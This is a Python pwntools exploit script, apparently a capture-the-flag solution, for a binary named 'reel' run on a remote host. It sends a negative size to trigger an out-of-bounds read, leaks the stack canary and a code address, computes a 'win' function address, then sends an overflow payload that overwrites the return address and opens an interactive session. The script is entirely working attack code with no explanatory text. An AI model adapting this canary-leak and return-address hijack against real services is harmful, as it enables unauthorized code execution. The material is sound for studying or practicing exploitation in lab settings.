from pwn import *
import string
context.log_level = "debug"
context.arch = "amd64"
context.endian = "little"
context.binary = binary = ELF('./reel')
# p = process("./reel")
p = remote("sisterlab.id", 42042)
p.sendlineafter("[>] input array size (smaller than 16): ", b"-1")

def leakstack(choice):
        p.sendlineafter("[>] user input: ",b"3")
        p.sendlineafter("[>] enter last index: ",f"{choice-1}")
        p.sendlineafter("[>] use compact mode? (y/n): ",b"y")
        leak1 = p.recvuntil("=========================================")
        leak1 = leak1[:-43]
        leak1 = leak1[23:]
        leak1 = int(leak1)
        p.sendlineafter("[>] user input: ",b"3")
        p.sendlineafter("[>] enter last index: ",f"{choice}")
        p.sendlineafter("[>] use compact mode? (y/n): ",b"y")
        leak2 = p.recvuntil("=========================================")
        leak2 = leak2[:-43]
        leak2 = leak2[23:]
        leak2 = int(leak2)
        return leak2-leak1
    

canary1 = leakstack(51)
canary2 = leakstack(52)

main1 = leakstack(63)
main2 = leakstack(64)

win1 = main1-0x4E9 + 19
win2 = main2



payload = b"A"*132 + b"BBBB" + p64(canary1)[:-4] + p64(canary2)[:-4] + b"AAAABBBB" + p64(win1)[:-4] + p64(win2)[:-4]
p.sendlineafter("[>] user input: ",b"4919")
p.sendlineafter("[v] you've found the secret stage!\n",payload)
print(f"win1 ==== {hex(win1)}")
print(f"win2 ==== {hex(win2)}")

p.interactive()